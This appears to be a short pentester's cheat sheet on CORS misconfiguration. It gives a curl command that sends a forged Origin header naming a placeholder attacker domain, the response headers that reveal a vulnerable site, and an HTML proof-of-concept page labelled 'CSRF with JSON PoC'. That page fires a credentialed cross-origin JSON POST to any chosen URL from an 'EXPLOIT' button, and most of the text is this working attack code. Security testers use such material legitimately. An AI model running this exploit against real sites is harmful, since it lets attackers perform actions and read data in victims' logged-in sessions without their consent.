### detect cors vulns (also add . at the end of the domain)
```
curl https://<domain> -H "Origin: https://<attackerDomain>" -I
```

### check for:
```
Access-Control-Allow-Origin: https://<attackerDomain>
Access-Control-Allow-Credentials: true
```

### proof of concept code
```
<html>
<head>
    <meta charset="utf-8"/>
</head>
<body>
    <script>
    function jsonreq()
    {
        console.log(document.getElementById("url").value);
        console.log(document.getElementById("jsonInput").value);
        var jsonObj = JSON.parse(document.getElementById("jsonInput").value)
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.withCredentials = true;
        xmlhttp.open("POST", document.getElementById("url").value, true);
        xmlhttp.setRequestHeader("Content-Type","application/json");
        xmlhttp.send(JSON.stringify(jsonObj));
        alert(xmlhttp.response)
    }
    </script>
    <h1> CSRF with JSON PoC</h1>
    <input size="100" id="url" placeholder="Enter URL">
    <br><br>
    <input size="100" id="jsonInput" placeholder="Enter JSON">
    <br><br>
    <button onclick="jsonreq()">EXPLOIT</button>
</body>
</html>
```

